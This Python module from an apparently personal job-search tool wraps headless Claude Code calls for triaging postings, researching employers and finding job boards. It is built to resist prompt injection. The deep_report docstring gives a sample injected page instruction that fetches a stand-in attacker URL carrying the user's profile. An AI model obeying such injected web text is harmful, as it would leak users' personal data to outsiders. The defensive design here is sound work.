"""Headless Claude Code calls (`claude -p`).

Triage runs with no tools; the deep report and the source search get only WebSearch and WebFetch.
`--restricted` keeps command execution out and ignores the user's settings files,
so job-board text cannot steer Claude into touching this machine.
"""
from __future__ import annotations

import fcntl
import json
import logging
import os
import re
import subprocess
import time
from contextlib import contextmanager
from datetime import date
from pathlib import Path

from .model import Posting

log = logging.getLogger("job-radar")
PROMPTS = Path(__file__).resolve().parent.parent / "prompts"
# Set by the CLI: all instances on a machine share one file, so their Claude processes
# run one at a time (each needs ~270 MB, too much to run several on a Raspberry Pi).
LOCK_PATH: Path | None = None
LOCK_WAIT_S = 1800
# Set by the CLI: an empty directory as the working directory of every call, so even a
# file tool that slipped through would see nothing there (not the repo, not the configs).
WORK_DIR: Path | None = None
TRIAGE_TEXT_LIMIT = 1500


class ClaudeError(RuntimeError):
    pass


def _usage(model: str, out: dict, limits: dict) -> dict:
    u = out.get("usage") or {}
    # input_tokens is the total, as in rows from before the cache parts were kept apart (#17).
    usage = {"model": model, "cost_usd": out.get("total_cost_usd", 0),
             "input_tokens": sum(u.get(k, 0) for k in ("input_tokens", "cache_creation_input_tokens",
                                                        "cache_read_input_tokens")),
             "cache_write": u.get("cache_creation_input_tokens", 0), "cache_read": u.get("cache_read_input_tokens", 0),
             "ok": 1, "output_tokens": u.get("output_tokens", 0), "duration_ms": out.get("duration_ms", 0)}
    # Plan limits of the whole account (not only this service), as Claude Code reports them.
    for window in ("five_hour", "seven_day"):
        if window in limits:
            usage[window] = limits[window].get("utilization")
            usage[f"{window}_resets"] = limits[window].get("resetsAt")
    return usage


def _parse_stream(stdout: str) -> tuple[dict, dict]:
    result, limits = {}, {}
    for line in (stdout or "").splitlines():
        try:
            event = json.loads(line)
        except json.JSONDecodeError:
            continue
        if event.get("type") == "result":
            result = event
        elif event.get("type") == "rate_limit_event":
            limits = (event.get("rate_limit_info") or {}).get("unifiedWindows") or limits
    return result, limits


@contextmanager
def _one_at_a_time(wait: float):
    if LOCK_PATH is None:
        yield
        return
    LOCK_PATH.parent.mkdir(parents=True, exist_ok=True)
    with open(LOCK_PATH, "a") as f:
        deadline = time.monotonic() + wait
        while True:
            try:
                fcntl.flock(f, fcntl.LOCK_EX | fcntl.LOCK_NB)
                break
            except BlockingIOError:
                if time.monotonic() >= deadline:
                    raise ClaudeError(f"another Claude call held {LOCK_PATH} for over {wait:.0f} s")
                time.sleep(min(1.0, wait / 10))
        yield  # closing the file releases the lock


def run(prompt: str, *, model: str, tools: list[str], timeout: int = 300, runner=subprocess.run,
        on_usage=None, thinking: bool = True, lock_wait: float = LOCK_WAIT_S, system: str | None = None,
        cache: bool = True) -> str:
    """`system` replaces Claude Code's own system prompt (about 3k tokens on every call); only
    for calls without tools, since the default prompt is what teaches Claude to use them.
    `cache=False` for a one-shot call whose prompt is never read back: Claude Code writes the
    whole prompt to a 1-hour cache, at twice the input price."""
    args = ["claude", "-p", "--output-format", "stream-json", "--verbose", "--model", model,
            "--restricted", "--strict-mcp-config", "--no-session-persistence",
            "--tools", ",".join(tools)]
    if system is not None:
        args += ["--system-prompt", system]
    if tools:
        args += ["--allowedTools", ",".join(tools)]
    # No update check or telemetry at start-up: about 3 s faster per call on the Pi.
    # Update Claude Code by hand instead (`claude update`).
    env = {**os.environ, "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": "1", "DISABLE_AUTOUPDATER": "1"}
    if not thinking:
        env["MAX_THINKING_TOKENS"] = "0"
    if not cache:
        env["DISABLE_PROMPT_CACHING"] = "1"
    asked = started = time.monotonic()
    try:
        with _one_at_a_time(lock_wait):
            started = time.monotonic()
            cwd = None
            if WORK_DIR is not None:
                WORK_DIR.mkdir(mode=0o700, parents=True, exist_ok=True)
                cwd = str(WORK_DIR)
            proc = runner(args, input=prompt, capture_output=True, text=True, timeout=timeout, env=env, cwd=cwd)
    except subprocess.TimeoutExpired:
        if on_usage:  # failed calls are counted too, so the measurement sees them (#17)
            on_usage({"model": model, "cost_usd": 0, "ok": 0, "error": f"timeout after {timeout} s",
                      "duration_ms": int((time.monotonic() - started) * 1000)})
        raise
    out, limits = _parse_stream(proc.stdout)
    # "ran" minus "API" is the CLI's own start-up, slow on a Pi with a cold SD card.
    log.info("claude %s: lock %.1f s, ran %.1f s, API %.1f s", model, started - asked,
             time.monotonic() - started, out.get("duration_ms", 0) / 1000)
    if proc.returncode != 0 or out.get("is_error") or "result" not in out:
        error = f"claude exited {proc.returncode}: {(proc.stderr or proc.stdout or '')[:500]}"
        if on_usage:
            on_usage({**_usage(model, out, limits), "ok": 0, "error": error[:200]})
        raise ClaudeError(error)
    if on_usage:
        on_usage(_usage(model, out, limits))
    return out["result"]


def probe_limits(*, runner=subprocess.run, on_usage=None) -> None:
    """Tiny Haiku call, only to read the current plan-limit utilization."""
    run("Reply with: ok", model="haiku", tools=[], timeout=120, runner=runner, on_usage=on_usage, thinking=False,
        system="Reply in one word.", cache=False)


def _fill(template: str, **values: str) -> str:
    text = (PROMPTS / template).read_text(encoding="utf-8")
    for k, v in values.items():
        text = text.replace("{{" + k + "}}", v)
    return text


def _split(template: str, **values: str) -> tuple[str, str]:
    """A template's fixed instructions above its `<!-- message -->` line, as the system prompt,
    and the filled-in part below it, as the message."""
    system, message = _fill(template, **values).split("<!-- message -->\n", 1)
    return system.strip(), message


def describe(p: Posting, text_limit: int | None = None) -> str:
    text = p.text if text_limit is None else p.text[:text_limit]
    # Feeds often carry only a title ("Role (City) - Employer"); without this hint the model asks for more.
    text = text or "(none in this source: rate on title, company and location)"
    lines = [f"id: {p.id}", f"title: {p.title}", f"company: {p.company}", f"location: {p.location}",
             f"remote/hybrid: {'yes' if p.remote else 'not stated'}", f"contract: {p.contract_type or 'unknown'}", f"url: {p.url}"]
    if p.salary:
        lines.append(f"salary: {p.salary}")
    if p.tags:
        lines.append(f"tags: {', '.join(p.tags)}")
    return "\n".join(lines) + f"\ntext:\n{text}"


def _json_array(reply: str) -> list:
    match = re.search(r"\[.*\]", reply, re.S)
    if not match:
        raise ClaudeError(f"no JSON array in triage reply: {reply[:200]}")
    try:
        return json.loads(match.group(0))
    except json.JSONDecodeError as e:
        raise ClaudeError(f"bad triage JSON: {e}") from e


def _examples(likes, dislikes) -> str:
    """What the person bookmarked or removed before, as hints for rating similar postings."""
    parts = []
    for heading, items in (("Postings this candidate bookmarked or applied to (rate similar ones higher)", likes),
                           ("Postings this candidate removed (rate similar ones lower)", dislikes)):
        if items:
            parts.append(f"## {heading}\n\n" + "\n".join(f"- {p.title} ({p.company or '?'})" for p in items))
    return "\n\n".join(parts)


def triage(postings: list[Posting], *, profile: str, model: str, runner=subprocess.run,
           on_usage=None, likes=(), dislikes=()) -> dict[int, tuple[int, str, str, str]]:
    """Score, why, employer line and the employer's website (http(s) or "") per posting id."""
    block = "\n\n---\n\n".join(describe(p, TRIAGE_TEXT_LIMIT) for p in postings)
    # Rating short postings needs no extended thinking; it made calls ~10x slower and 3x pricier.
    # No cache: what the batches share (instructions, profile) stays below Haiku's 4096-token minimum.
    system, message = _split("triage.md", profile=profile, examples=_examples(likes, dislikes), postings=block)
    reply = run(message, model=model, tools=[], runner=runner, on_usage=on_usage, thinking=False, system=system,
                cache=False)
    known = {p.id for p in postings}
    scores = {}
    for item in _json_array(reply):
        try:
            pid, score = int(item["id"]), int(item["score"])
        except (KeyError, TypeError, ValueError):
            continue
        if pid in known:
            website = str(item.get("website") or "")
            scores[pid] = (score, str(item.get("why", "")), str(item.get("employer", "")),
                           website if re.match(r"https?://", website) else "")
    return scores


def deep_report(p: Posting, *, profile: str, model: str, timeout: int = 900, runner=subprocess.run,
                on_usage=None) -> str:
    """Two calls: the web research never sees the profile, so a page that injects "fetch
    evil.example/?q=<profile>" has nothing to leak; the report is then written without tools."""
    notes = run(_fill("deep-research.md", posting=describe(p)), model=model, tools=["WebSearch", "WebFetch"],
                timeout=timeout, runner=runner, on_usage=on_usage)
    prompt = _fill("deep-report.md", profile=profile, posting=describe(p), notes=notes,
                   today=date.today().isoformat())
    return run(prompt, model=model, tools=[], timeout=timeout, runner=runner, on_usage=on_usage).strip()


def find_sources(*, field: str, known: list[str], model: str, timeout: int = 900, runner=subprocess.run,
                 on_usage=None) -> list[dict]:
    """Job boards for a field and region, as {name, url, why, kind}; the caller still checks they can be read.

    `field` is search terms and region only: this call fetches web pages, so it gets no profile."""
    prompt = _fill("sources.md", field=field, known="\n".join(f"- {u}" for u in known) or "(none)")
    reply = run(prompt, model=model, tools=["WebSearch", "WebFetch"], timeout=timeout, runner=runner,
                on_usage=on_usage)
    found = []
    for item in _json_array(reply):
        if not isinstance(item, dict):
            continue
        name, url = str(item.get("name") or "").strip(), str(item.get("url") or "").strip()
        if name and re.match(r"https?://", url):
            kind = "page" if item.get("kind") == "page" else "feed"
            found.append({"name": name[:60], "url": url, "why": str(item.get("why") or "")[:200], "kind": kind})
    return found


def find_employers(*, field: str, known: list[str], model: str, timeout: int = 900, runner=subprocess.run,
                   on_usage=None) -> list[dict]:
    """Employers of a field and region that welcome unsolicited applications, as {name, url, location,
    about, why}; the caller still checks the page. Like find_sources it gets no profile."""
    prompt = _fill("employers.md", field=field, known="\n".join(f"- {n}" for n in known) or "(none)")
    reply = run(prompt, model=model, tools=["WebSearch", "WebFetch"], timeout=timeout, runner=runner,
                on_usage=on_usage)
    found = []
    for item in _json_array(reply):
        if not isinstance(item, dict):
            continue
        name, url = str(item.get("name") or "").strip(), str(item.get("url") or "").strip()
        if name and re.match(r"https?://", url):
            found.append({"name": name[:80], "url": url, "location": str(item.get("location") or "")[:60],
                          "about": str(item.get("about") or "")[:150], "why": str(item.get("why") or "")[:200]})
    return found


def extract_postings(page: str, *, model: str = "haiku", runner=subprocess.run, on_usage=None) -> list[dict]:
    """Postings on a job board's list page (reduced by sources.pages), as {link, title, employer, location}."""
    system, message = _split("board-page.md", page=page)
    reply = run(message, model=model, tools=[], timeout=300, runner=runner, on_usage=on_usage, thinking=False,
                system=system, cache=False)
    return [item for item in _json_array(reply) if isinstance(item, dict) and isinstance(item.get("link"), int)]
